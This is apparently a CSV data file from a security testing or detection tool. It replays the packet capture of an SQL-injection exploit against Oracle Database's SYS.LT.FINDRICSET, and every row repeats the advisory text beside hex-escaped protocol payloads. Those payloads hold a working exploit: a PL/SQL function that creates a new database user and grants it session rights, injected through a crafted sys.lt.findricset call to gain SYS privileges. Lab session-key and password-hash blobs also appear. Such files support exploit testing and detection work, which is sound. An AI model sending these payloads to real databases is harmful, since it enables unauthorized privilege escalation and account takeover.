XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 ]]%[[00 00 06 00 00 00 00 00 01 06 05 04 03 02 01 00 ]]IBMPC/WIN_NT-8.1.0[[00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 ]]>[[00 00 06 00 00 00 00 00 02 B2 00 B2 00 ]]B[[1B 06 01 01 01 0D 01 01 03 01 01 01 01 01 01 01 FF ]][[03 07 03 00 01 00 0F 01 01 01 04 02 01 00 00 80 00 00 00 ]]<<<[[80 00 00 00 D0 07]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 EC 00 00 06 00 00 00 00 00 03 ]]v[[02 F4 E8 D5 05 04 00 00 00 01 00 00 00 ]]`[[CB 12 00 05 00 00 00 08 C9 12 00 ]]([[CD 12 00 04 ]]test[[0D 00 00 00 0D ]]AUTH_TERMINAL[[0E 00 00 00 0E ]]VRTVM-WIN2KSRV[[00 00 00 00 0F 00 00 00 0F ]]AUTH_PROGRAM_NM[[0B 00 00 00 0B ]]sqlplus.exe[[00 00 00 00 0C 00 00 00 0C ]]AUTH_MACHINE[[12 00 00 00 12 ]]VRT\VRTVM-WIN2KSRV[[00 00 00 00 08 00 00 00 08 ]]AUTH_PID[[08 00 00 00 08 ]]344:1436[[00 00 00 00 08 00 00 00 08 ]]AUTH_SID[[0D 00 00 00 0D ]]Administrato[[04 00 00 00 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[02 00 00 00 06 00 00 00 00 00 03 ]]s[[03 F4 E8 D5 05 04 00 00 00 01 01 00 00 EC F8 12 00 09 00 00 00 A8 F4 12 00 ]]P[[FB 12 00 04 ]]test[[0C 00 00 00 0C ]]AUTH_SESSKEY@[[00 00 00 ]]@2252DB550BF5A9586F06BC0F67A302E2243A0430F2AFD67182BB3F8E2E858914[[01 00 00 00 0D 00 00 00 0D ]]AUTH_PASSWORD@[[00 00 00 ]]@12FF24AC0A1DB9CEB6619185CBD6A86218E44B9971B2928BDA55B638F68DCE3A[[00 00 00 00 0D 00 00 00 0D ]]AUTH_TERMINAL[[0E 00 00 00 0E ]]VRTVM-WIN2KSRV[[00 00 00 00 0F 00 00 00 0F ]]AUTH_PROGRAM_NM[[0B 00 00 00 0B ]]sqlplus.exe[[00 00 00 00 0C 00 00 00 0C ]]AUTH_MACHINE[[12 00 00 00 12 ]]VRT\VRTVM-WIN2KSRV[[00 00 00 00 08 00 00 00 08 ]]AUTH_PID[[08 00 00 00 08 ]]344:1436[[00 00 00 00 08 00 00 00 08 ]]AUTH_SID[[0D 00 00 00 0D 00 00 00 00 0F ]]'[[00 00 ]]4[[BF 12 00 1C 00 00 00 00 08 00 00 00 08 ]]AUTH_ACL[[04 00 00 00 04 ]]4400[[00 00 00 00 12 00 00 00 12 ]]AUTH_ALTER_SESSION%[[00 00 00 ]]%ALTER SESSION SET TIME_ZONE='-08:00'[[00 01 00 00 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,"[[00 ]],[[00 00 06 00 00 00 00 00 11 ]]k[[04 98 00 00 00 ]]z[[02 00 00 01 00 00 00 03 ]];[[05 D8 FA 12 00 F4 01 00 00 B8 F9 12 00 B4 F9 12 00]]"
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 A8 00 00 06 00 00 00 00 00 03 ]]^[[06 ]]a[[80 00 00 00 00 00 00 0C BB D7 05 16 00 00 00 ]]<[[CF D5 05 0D 00 00 00 00 00 00 00 ]]p[[CF D5 05 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]r[[CF D5 05 ]]l[[BB D7 05 00 00 00 00 16 ]]SELECT USER FROM DUAL[[00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 15 00 00 06 00 00 00 00 00 03 05 07 01 00 00 00 02 00 00 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 C9 00 00 06 00 00 00 00 00 11 ]]i[[08 10 AB D7 05 01 00 00 00 01 00 00 00 03 ]]^[[09 ]]a[[80 00 00 00 00 00 00 F8 BE D7 05 ]]([[00 00 00 ]]<[[CF D5 05 0D 00 00 00 00 00 00 00 ]]p[[CF D5 05 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]r[[CF D5 05 ]]$[[AB D7 05 00 00 00 00 ]](SELECT NULL FROM DUAL FOR UPDATE NOWAIT[[00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 C0 00 00 06 00 00 00 00 00 11 ]]i[[0A 10 AB D7 05 01 00 00 00 01 00 00 00 03 ]]^[[0B ]]![[00 04 00 00 00 00 00 04 BF D7 05 1F 00 00 00 ]]<[[CF D5 05 0D 00 00 00 00 00 00 00 ]]p[[CF D5 05 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]r[[CF D5 05 ]]$[[AB D7 05 00 00 00 00 1F ]]BEGIN DBMS_OUTPUT.DISABLE; END;[[01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,"[[01 ]]F[[00 00 06 00 00 00 00 00 11 ]]i[[0C 10 AB D7 05 01 00 00 00 01 00 00 00 03 ]]^[[0D ]]a[[80 00 00 00 00 00 00 80 BE D7 05 A1 00 00 00 ]]<[[CF D5 05 0D 00 00 00 00 00 00 00 ]]p[[CF D5 05 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]r[[CF D5 05 ]]$[[AB D7 05 00 00 00 00 FE ]]@SELECT ATTRIBUTE,SCOPE,NUMERIC_VALUE,CHAR_VALUE,DATE_VALUE FROM @SYSTEM.PRODUCT_PRIVS WHERE (UPPER('SQL*Plus') LIKE UPPER(PRODUCT!)) AND (UPPER(USER) LIKE USERID)[[00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]"
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[01 ]]][[00 00 06 00 00 00 00 00 11 ]]i[[0E 10 AB D7 05 01 00 00 00 01 00 00 00 03 ]]^[[0F ]]a[[80 00 00 00 00 00 00 ]]h[[BE D7 05 B8 00 00 00 ]]<[[CF D5 05 0D 00 00 00 00 00 00 00 ]]p[[CF D5 05 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]r[[CF D5 05 ]]$[[AB D7 05 00 00 00 00 FE ]]@SELECT CHAR_VALUE FROM SYSTEM.PRODUCT_PRIVS WHERE   (UPPER('SQL*@Plus') LIKE UPPER(PRODUCT)) AND   ((UPPER(USER) LIKE USERID) OR 8(USERID = 'PUBLIC')) AND   (UPPER(ATTRIBUTE) = 'ROLES')[[00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,"[[01 02 00 00 06 00 00 00 00 00 11 ]]i[[10 10 AB D7 05 01 00 00 00 01 00 00 00 03 ]]^[[11 ]])[[04 04 00 00 00 00 00 EC BE D7 05 ]]6[[00 00 00 ]]<[[CF D5 05 0D 00 00 00 00 00 00 00 ]]p[[CF D5 05 00 00 00 00 01 00 00 00 00 00 00 00 ]]$[[AB D7 05 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]r[[CF D5 05 ]]$[[AB D7 05 00 00 00 00 ]]6BEGIN DBMS_APPLICATION_INFO.SET_MODULE(:1,NULL); END;[[00 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 01 03 00 00 08 00 00 00 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 B2 00 01 00 00 00 00 00 07 08 ]]SQL*Plus"
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,"[[00 EA 00 00 06 00 00 00 00 00 11 ]]i[[12 10 AB D7 05 01 00 00 00 01 00 00 00 03 ]]^[[13 ]]q[[80 00 00 00 00 00 00 F8 BE D7 05 ]]([[00 00 00 ]]<[[CF D5 05 0D 00 00 00 00 00 00 00 ]]p[[CF D5 05 00 00 00 00 01 00 00 00 16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]r[[CF D5 05 ]]$[[AB D7 05 01 00 00 00 ]](SELECT DECODE('A','A','1','2') FROM DUAL[[01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 02 03 00 00 16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]"
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 ]]H[[00 00 06 00 00 00 00 00 11 ]]i[[14 10 AF D7 05 01 00 00 00 01 00 00 00 03 ]]h[[15 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 B8 FC 12 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 ]]9[[00 00 06 00 00 00 00 00 03 ]]h[[16 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 00 00 00 B8 FC 12 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[01 90 00 00 06 00 00 00 00 00 03 ]]^[[17 ]]![[80 00 00 00 00 00 00 ]]([[BE D7 05 F9 00 00 00 ]]<[[CF D5 05 0D 00 00 00 00 00 00 00 ]]p[[CF D5 05 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]r[[CF D5 05 ]]<[[AB D7 05 00 00 00 00 FE ]]@  CREATE OR REPLACE FUNCTION OWN RETURN NUMBER[[0A ]]  AUTHID CURRENT_@USER AS[[0A ]]  PRAGMA AUTONOMOUS_TRANSACTION;[[0A ]]BEGIN[[0A ]]  EXECUTE IMMEDIA@TE 'create user xxxx identified by yyyy';[[0A ]]  EXECUTE IMMEDIATE 'g9rant create session to xxxx';[[0A ]]  COMMIT;[[0A ]]  RETURN(0);[[0A ]]END;[[00 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 05 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,"[[00 DB 00 00 06 00 00 00 00 00 11 ]]i[[18 10 AB D7 05 01 00 00 00 01 00 00 00 03 ]]^[[19 ]]![[00 04 00 00 00 00 00 E8 BE D7 05 ]]:[[00 00 00 ]]<[[CF D5 05 0D 00 00 00 00 00 00 00 ]]p[[CF D5 05 00 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]r[[CF D5 05 ]]<[[AB D7 05 00 00 00 00 ]]:BEGIN sys.lt.findricset('.''||test.own()||''','.'); END;[[0A 00 01 00 00 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]"
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 0B 00 00 0C 00 00 00 01 00 02]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 0D 00 00 06 00 00 00 00 00 03 09 1A]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 0A 00 00 06 00 00 00 00 ]]@
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 08 00 00 0B 00 00 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 ]] [[00 00 02 00 00 00 01 ]]9[[00 00 08 00 ]][[FF 01 00 00 00 00 ]] aA[[00 00 00 00 00 00 00 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 ]][[00 00 06 00 00 00 00 00 DE AD BE EF 00 ]]u[[0A ]] [[01 00 00 04 00 00 04 00 03 00 00 00 00 00 04 00 05 0A ]] [[01 00 00 02 00 06 00 1F 00 0E 00 01 DE AD BE EF 00 03 00 00 00 02 00 04 00 01 00 01 00 02 00 00 00 00 00 04 00 05 0A ]] [[01 00 00 02 00 06 FB FF 00 02 00 02 00 00 00 00 00 04 00 05 0A ]] [[01 00 00 01 00 02 00 00 03 00 02 00 00 00 00 00 04 00 05 0A ]] [[01 00 00 01 00 02 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 B3 00 00 06 00 00 00 00 00 01 06 00 ]]IBMPC/WIN_NT-8.1.0[[00 B2 00 01 00 00 00 ]]d[[00 00 00 ]]`[[01 ]]$[[0F 05 0B 0C 03 0C 0C 05 04 05 0D 06 09 07 08 05 05 05 05 05 0F 05 05 05 05 05 0A 05 05 05 05 05 04 05 06 07 08 08 ]]#G##[[08 11 ]]#[[08 11 ]]A[[B0 ]]#[[00 83 00 B2 07 D0 03 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ]]![[06 01 01 01 0D 01 01 04 01 01 01 01 01 01 01 FF FF 03 08 03 00 01 00 ]]?[[01 07 ]]?[[01 01 01 01 03 01 05 02 01 00 01 18]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 16 00 00 06 00 00 00 00 00 02 80 00 00 00 ]]<<<[[80 00 00 00]]
FSC20071029-03_Oracle_Database_SYS_LT_FINDRICSET_SQL_Injectioni_IPv6.xml,Oracle Database SYS.LT.FINDRICSET SQL Injection (IPv6 Version),"There exists a SQL injection vulnerability in Oracle Database. The vulnerability is due to insufficient sanitization of the input parameter in the ""SYS.LT.FINDRICSET"" function. A remote authenticated attacker could exploit this vulnerability by embedding malicious SQL code as part of the vulnerable parameter. Successful exploitation would allow ""PUBLIC""users to gain ""SYS"" level privileges. (IPv6 Version)",TCP/IPv6,TCP,[[00 E1 00 00 06 00 00 00 00 00 08 02 00 0C 00 00 00 0C ]]AUTH_SESSKEY@[[00 00 00 ]]@051076AEEA87D1567105FFBA949A8A1DF5D762CCDB9A636BD81F944EF2C48B6D[[00 00 00 00 0D 00 00 00 0D ]]AUTH_VFR_DATA[[00 00 00 00 ]]9[[09 00 00 04 01 00 00 00 02 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 02 00 00 00 00 00 00 ]]6[[01 00 00 00 00 00 00 88 ]]:=[[0A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00]]
